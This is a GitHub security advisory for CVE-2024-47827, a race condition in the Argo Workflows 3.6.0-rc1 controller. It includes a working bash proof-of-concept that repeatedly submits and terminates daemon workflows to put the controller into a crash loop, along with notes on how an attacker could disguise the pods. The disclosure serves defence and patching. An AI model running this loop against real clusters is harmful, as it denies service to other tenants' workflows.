# [M] Argo Workflows Controller: Denial of Service via malicious daemon Workflows

## Summary
Severity: Medium
Advisory: GHSA-ghjw-32xw-ffwr
CVE: CVE-2024-47827
CWE: CWE-1108, CWE-362
Ecosystem: Go
CVSS: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-10-28
Source: https://github.com/advisories/GHSA-ghjw-32xw-ffwr
Type: github-advisory

## Affected
- Go: `github.com/argoproj/argo-workflows/v3` — affected >=3.6.0-rc1 <3.6.0-rc2

## Details
### Summary

Due to a race condition in a global variable, the argo workflows controller can be made to crash on-command by any user with access to execute a workflow.

This was resolved by https://github.com/argoproj/argo-workflows/pull/13641

### Details

These two lines introduce a data race in the underlying SPDY implementation of the Kubernetes API client. If a second request is made before the first completes, it results in a panic due to a null pointer.
* https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L49
* https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L75

This appears to have been added in this commit https://github.com/argoproj/argo-workflows/commit/9756babd0ed589d1cd24592f05725f748f74130b / #13265 / v3.6.0-rc1

### PoC

With the `KUBECONFIG` variable set to an appropriate file with `create` permissions for the `Workflow` kind, execute the following bash script:

```bash
#!/bin/bash -xeu

while true ; do
    name=$(
        { argo submit /dev/stdin <<'EOF'
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  generateName: curl-
spec:
  entrypoint: main
  templates:
  - name: main
    dag:
      tasks:
        - name: no-op
          template: no-op
          withSequence:
            count: 3
  - name: no-op
    daemon: true
    container:
      image: alpine:3.13
      command: [sleep, infinity]
EOF
    } | head -n1 | awk '{ print $2 }'
    )
    ( sleep 30; argo terminate $name ) &
    sleep 15
done
```

This script creates, and subsequently cleans up, multiple `daemon` pods in rapid succession. Each pod cleanup involves executing a `kill` instruction using the Kubernetes `exec` API, triggering the conditions for the panic. This can be seen when the tests mark the pods as complete, but the workflow itself never completes. Observing the controller logs when this happens shows the panic and restart of the controller every few seconds. In a setup with exponential backoff (e.g. a Kubernetes Pod) this is enough to reliably cause crashes enough to extend this backoff significantly and leave other workflows stalled.

Because the restarted controller believes it has sent the `kill` signal, it will wait indefinitely for the pod to terminate, which it never will, so the attack must constantly garbage-collect its own workflows with the `argo terminate` command, otherwise the maximum concurrently running workflows will be reached. A more sophisticated attack could detect when the workflow has been signaled to clean up and terminate it then instead of relying on a simple timer.

### Impact

A malicious user with access to create workflows can continually submit workflows that do nothing except create and then clean up multiple daemon pods, resulting in a crash-loop that prevents other users' workflows from running. This can be done with only a handful of pods and very little cpu and memory, meaning typical multi-tenant Kubernetes controls such as Pod count and resource quotas are not effective at preventing it.

Because the panic log does not in any way suggest that the issue has anything to do with the daemon pods, and an attacker could easily disguise these daemon pods as part of a genuine workflow, it would be difficult for administrators to discover the root cause of the DoS and the individuals responsible to remove their access.

## References
- https://github.com/argoproj/argo-workflows/security/advisories/GHSA-ghjw-32xw-ffwr
- https://nvd.nist.gov/vuln/detail/CVE-2024-47827
- https://github.com/argoproj/argo-workflows/pull/13641
- https://github.com/argoproj/argo-workflows/commit/524406451f4dfa57bf3371fb85becdb56a2b309a
- https://github.com/argoproj/argo-workflows
- https://github.com/argoproj/argo-workflows/blob/ce7f9bfb9b45f009b3e85fabe5e6410de23c7c5f/workflow/metrics/metrics_k8s_request.go#L75
